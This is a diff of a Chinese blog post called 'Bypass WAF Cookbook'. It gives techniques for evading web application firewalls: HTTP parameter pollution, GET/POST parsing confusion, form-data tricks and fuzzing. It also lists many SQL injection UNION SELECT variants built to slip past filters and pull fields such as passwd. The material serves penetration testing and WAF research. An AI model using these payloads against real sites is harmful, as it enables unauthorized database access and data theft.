@@ -21,13 +21,15 @@
 <li><strong>获取参数的方式</strong><ul>
 <li>变换请求方式：<ul>
 <li>在web应用中使用了统一获取参数的方式: 如php里使用$_REQUEST获取参数，但WAF层如果过滤不全则容易bypass，如，waf层过滤了get/post，但没有过滤cookie，而web应用层并不关心参数是否来自cookie</li>
-<li>urlencode和form-data: POST在提交数据的时候有两种方式，第一种方式是使用urlencode的方式提交，第二种方式是使用form-data的方式提交。当我们在测试的时候，如果发现POST提交的数据被过滤掉了，此时可以考虑使用form-data的方式去提交。<ul>
-<li>畸形请求方式：</li>
-<li>asp/asp.net request解析:<br>在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type, 换一种理解方式也就是将原本的post数据包的method改成GET,如果使用request(‘id’)方式获取数据，仍会获取到post的内容</li>
-<li>HTTP参数污染:</li>
-<li>当WAF获取参数的形式与WEB程序获取参数的形式不一致的时候就可能出现bypass<br>asp.net + iis：id=1,2,3<br>asp + iis    ：id=1,2,3<br>php + apache ：id=3<br>jsp + tomcat ：id=1</li>
+<li>urlencode和form-data: POST在提交数据的时候有两种方式，第一种方式是使用urlencode的方式提交，第二种方式是使用form-data的方式提交。当我们在测试的时候，如果发现POST提交的数据被过滤掉了，此时可以考虑使用form-data的方式去提交。</li>
 </ul>
 </li>
+<li>畸形请求方式：<ul>
+<li>asp/asp.net request解析:<br>在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type, 换一种理解方式也就是将原本的post数据包的method改成GET,如果使用request(‘id’)方式获取数据，仍会获取到post的内容</li>
+</ul>
+</li>
+<li>HTTP参数污染:<ul>
+<li>当WAF获取参数的形式与WEB程序获取参数的形式不一致的时候就可能出现bypass<br>asp.net + iis：id=1,2,3<br>asp + iis    ：id=1,2,3<br>php + apache ：id=3<br>jsp + tomcat ：id=1</li>
 </ul>
 </li>
 </ul>
@@ -51,15 +53,7 @@
 <li>空白符  ==&gt; 同上</li>
 <li>注释      ==&gt; 同上</li>
 <li>括号      ==&gt; select * from user where id =1 union select(1)from other</li>
-<li>运算符  ==&gt; select * from user where id =1 union select-1,2,3<pre><code>==&gt; select * from user where id =1 union select+1,2,3
-==&gt; select * from user where id =1 union select~1,2,3
-==&gt; select * from user where id =1 union select!1,2,3
-==&gt; select * from user where id =1 union select@1,2,3
-==&gt; select * from user where id =1 union select-1+1.from user
-==&gt; select * from user where id =1 union select@\`id\`,2,3
-==&gt; select * from user where id =1 union select\`version\`()
-==&gt; select * from user where id =1 union /\*!50000select\*/1,2,3
-</code></pre></li>
+<li>运算符  ==&gt; select <em> from user where id =1 union select-1,2,3<br>==&gt; select </em> from user where id =1 union select+1,2,3<br>==&gt; select <em> from user where id =1 union select~1,2,3<br>==&gt; select </em> from user where id =1 union select!1,2,3<br>==&gt; select <em> from user where id =1 union select@1,2,3<br>==&gt; select </em> from user where id =1 union select-1+1.from user<br>==&gt; select <em> from user where id =1 union select@`id`,2,3<br>==&gt; select </em> from user where id =1 union select`version`()<br>==&gt; select <em> from user where id =1 union /\</em>!50000select*/1,2,3</li>
 <li>单引号  ==&gt; select * from user where id =1 union select’1’,2,3</li>
 <li>双引号  ==&gt; select * from user where id =1 union select”1”,2,3</li>
 <li>大括号  ==&gt; select * from user where id =1 union select{x 1},2,3</li>
@@ -69,24 +63,14 @@
 <li><strong>4. 查询字段和from之间:</strong><ul>
 <li>空白符  ==&gt; 同上</li>
 <li>注释    ==&gt; 同上</li>
-<li>浮点数  ==&gt; select * from user where id =1 union select 1,2,3.0from uesr<pre><code>==&gt; select * from user where id =1 union select 1,2,3.from uesr
-</code></pre></li>
-<li>其它    ==&gt; select * from user where id =1 union select`passwd`from uesr<pre><code>==&gt; select * from user where id =1 union select{x passwd}from uesr
-==&gt; select * from user where id =1 union select(passwd)from uesr
-==&gt; select * from user where id =1 union select 1,2,3&apos;&apos;from users
-==&gt; select * from user where id =1 union select 1,2,3&quot;&quot;from users
-</code></pre></li>
+<li>浮点数  ==&gt; select <em> from user where id =1 union select 1,2,3.0from uesr<br>==&gt; select </em> from user where id =1 union select 1,2,3.from uesr</li>
+<li>其它    ==&gt; select <em> from user where id =1 union select`passwd`from uesr<br>==&gt; select </em> from user where id =1 union select{x passwd}from uesr<br>==&gt; select <em> from user where id =1 union select(passwd)from uesr<br>==&gt; select </em> from user where id =1 union select 1,2,3’’from users<br>==&gt; select * from user where id =1 union select 1,2,3””from users</li>
 </ul>
 </li>
 <li><strong>5.from之后:</strong><ul>
 <li>空白符  ==&gt; 同上</li>
 <li>注释    ==&gt; 同上</li>
-<li>其它    ==&gt; select * from user where id =1 union select passwd from`uesr`<pre><code>==&gt; select * from user where id =1 union select passwd/\*!50000from\*/uesr
-==&gt; select * from user where id =1 union select passwd from{x user}
-==&gt; select * from user where id =1 union select passwd from(user)
-==&gt; select * from user where id =1 union select 1,2,id from. users
-==&gt; select * from user where id =1 union select 1,2,id from .users
-</code></pre></li>
+<li>其它    ==&gt; select <em> from user where id =1 union select passwd from`uesr`<br>==&gt; select </em> from user where id =1 union select passwd/*!50000from*/uesr<br>==&gt; select <em> from user where id =1 union select passwd from{x user}<br>==&gt; select </em> from user where id =1 union select passwd from(user)<br>==&gt; select <em> from user where id =1 union select 1,2,id from. users<br>==&gt; select </em> from user where id =1 union select 1,2,id from .users</li>
 </ul>
 </li>
 </ul>
@@ -94,18 +78,12 @@
 <li><strong>1. 性能</strong>：某些waf为了照顾性能，会将数据包截取一定长度用来检测，但如果发送的请求包数据长度超过waf规定的长度，则不对之后的内容进行检测</li>
 <li><strong>2.业务</strong>：某些waf为了规避业务上的问题会刻意留下漏洞(属于业务和技术的平衡点的问题,值得挖掘)</li>
 <li><strong>3. FUZZ</strong>：某些waf可能由于自身的解析问题，对于某些字符解析出错，造成全局bypass<ul>
-<li>fuzz位置:<pre><code>get请求处 
-header请求处 
-post urlencode内容处 
-post form-data内容处
-</code></pre></li>
-<li>fuzz内容:<pre><code>编码过的0-255字符 
-未编码过的0-255字符 
-</code></pre>Unicode/GBK字符</li>
+<li>fuzz位置:<br>get请求处<br>header请求处<br>post urlencode内容处<br>post form-data内容处</li>
+<li>fuzz内容:<br>编码过的0-255字符<br>未编码过的0-255字符<br>Unicode/GBK字符</li>
 </ul>
 </li>
 </ul>
-</div></article></div></main><footer><div class="paginator"><a href="/2016/10/27/字符编码学习笔记/" class="prev">上一篇</a><a href="/2016/10/23/Web渗透测试思路整理/" class="next">下一篇</a></div><div data-thread-key="2016/10/25/Bypass-WAF-Cookbook/" data-title="Bypass WAF Cookbook" data-url="http://goodwaf.com/2016/10/25/Bypass-WAF-Cookbook/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
+</div></article></div></main><footer><div class="paginator"><a href="/2016/10/27/字符编码学习笔记/" class="prev">PREV</a><a href="/2016/10/23/Web渗透测试思路整理/" class="next">NEXT</a></div><div data-thread-key="2016/10/25/Bypass-WAF-Cookbook/" data-title="Bypass WAF Cookbook" data-url="http://goodwaf.com/2016/10/25/Bypass-WAF-Cookbook/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
 (function() {
     var ds = document.createElement('script');
     ds.type = 'text/javascript';ds.async = true;
